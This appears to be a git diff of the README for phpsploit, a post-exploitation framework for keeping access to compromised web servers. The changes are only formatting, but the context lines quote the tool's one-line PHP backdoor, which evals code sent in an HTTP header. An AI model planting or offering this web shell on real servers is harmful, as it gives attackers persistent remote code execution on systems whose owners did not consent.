@@ -5,8 +5,9 @@ interactive shell-like connection over HTTP between client and web server.
 It is a post-exploitation tool capable to maintain access to a
 compromised web server for **privilege escalation** purposes.
 
----------------------------------------------------------
+![][picture]
 
+---------------------------------------------------------------------
 #### Overview ####
 
 The obfuscated communication is accomplished using HTTP headers under
@@ -16,6 +17,7 @@ a tiny **polymorphic backdoor**:
 <? @eval($_SERVER['HTTP_PHPSPL01T']) ?>
 ```
 
+---------------------------------------------------------------------
 #### Features ####
 
 - More than 20 plugins to automate post-exploitation tasks:
@@ -34,8 +36,7 @@ a tiny **polymorphic backdoor**:
 - HTTP/HTTPS Proxy support
 - And even more...
 
-#### Example #####
-![][picture]
 
----
+
+
 [picture]: https://raw.githubusercontent.com/nil0x42/phpsploit/destiny/data/img/phpsploit-demo.png
